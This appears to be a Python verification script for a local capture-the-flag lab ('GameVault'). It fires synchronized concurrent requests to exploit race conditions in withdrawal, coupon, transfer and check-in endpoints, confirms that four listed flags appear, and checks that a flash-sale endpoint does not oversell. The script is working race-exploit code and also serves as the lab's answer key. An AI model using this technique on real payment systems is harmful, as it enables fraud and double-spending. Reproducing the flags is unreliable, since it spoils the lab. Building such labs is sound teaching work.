"""Test script for GameVault lab - verify all 4 flags and safe operation."""
import threading
import requests
import time

BASE = "http://127.0.0.1:5025"

def concurrent_post(path, data=None, n=8):
    """Send n concurrent POST requests."""
    results = []
    barrier = threading.Barrier(n)

    def worker():
        barrier.wait()  # all threads start at the same time
        try:
            r = requests.post(f"{BASE}{path}", data=data or {}, allow_redirects=False, timeout=5)
            results.append(r.status_code)
        except Exception as e:
            results.append(str(e))

    threads = [threading.Thread(target=worker) for _ in range(n)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    return results


def get_flags():
    r = requests.get(BASE)
    flags = []
    for flag in ['FLAG{race_withdraw_overspend_2026}',
                 'FLAG{race_coupon_reuse_2026}',
                 'FLAG{race_transfer_lost_update_2026}',
                 'FLAG{race_checkin_multi_2026}']:
        if flag in r.text:
            flags.append(flag)
    return flags


def reset():
    requests.get(f"{BASE}/reset")
    time.sleep(0.5)


print("=" * 60)
print("GameVault 验证脚本")
print("=" * 60)

# FLAG1: Withdraw race
print("\n[FLAG1] 提现竞争 — 并发8个提现100积分请求...")
reset()
results = concurrent_post("/withdraw", {"amount": "100"}, n=8)
print(f"  响应状态码: {results}")
time.sleep(0.5)
flags = get_flags()
f1 = 'FLAG{race_withdraw_overspend_2026}' in str(flags)
print(f"  FLAG1: {'PASS' if f1 else 'FAIL'}")

# FLAG2: Coupon race
print("\n[FLAG2] 优惠券竞争 — 并发8个兑换GAME100请求...")
reset()
results = concurrent_post("/redeem", {"code": "GAME100"}, n=8)
print(f"  响应状态码: {results}")
time.sleep(0.5)
flags = get_flags()
f2 = 'FLAG{race_coupon_reuse_2026}' in str(flags)
print(f"  FLAG2: {'PASS' if f2 else 'FAIL'}")

# FLAG3: Transfer race (Lost Update)
print("\n[FLAG3] 转账竞争(Lost Update) — 并发8个转账80积分请求...")
reset()
results = concurrent_post("/transfer", n=8)
print(f"  响应状态码: {results}")
time.sleep(0.5)
flags = get_flags()
f3 = 'FLAG{race_transfer_lost_update_2026}' in str(flags)
print(f"  FLAG3: {'PASS' if f3 else 'FAIL'}")

# FLAG4: Checkin race
print("\n[FLAG4] 签到竞争 — 并发8个签到请求...")
reset()
results = concurrent_post("/checkin", n=8)
print(f"  响应状态码: {results}")
time.sleep(0.5)
flags = get_flags()
f4 = 'FLAG{race_checkin_multi_2026}' in str(flags)
print(f"  FLAG4: {'PASS' if f4 else 'FAIL'}")

# Safe operation: Flashbuy (should NOT oversell)
print("\n[SAFE] 限时抢购 — 并发10个抢购请求(库存3件)...")
reset()
results = concurrent_post("/flashbuy", n=10)
print(f"  响应状态码: {results}")
time.sleep(0.5)
r = requests.get(BASE)
# Check stock sold
if '已售 3 件' in r.text:
    print(f"  安全验证: PASS (只卖了3件, 没有超卖)")
elif '已售 10 件' in r.text or '已售 4 件' in r.text or '已售 5 件' in r.text:
    print(f"  安全验证: FAIL (超卖了!)")
else:
    # Extract sold number
    import re
    m = re.search(r'已售 (\d+) 件', r.text)
    sold = m.group(1) if m else "?"
    print(f"  安全验证: 已售 {sold} 件 (应为3)")

print("\n" + "=" * 60)
print(f"结果: FLAG1={'PASS' if f1 else 'FAIL'} FLAG2={'PASS' if f2 else 'FAIL'} FLAG3={'PASS' if f3 else 'FAIL'} FLAG4={'PASS' if f4 else 'FAIL'}")
print("=" * 60)

reset()  # clean up
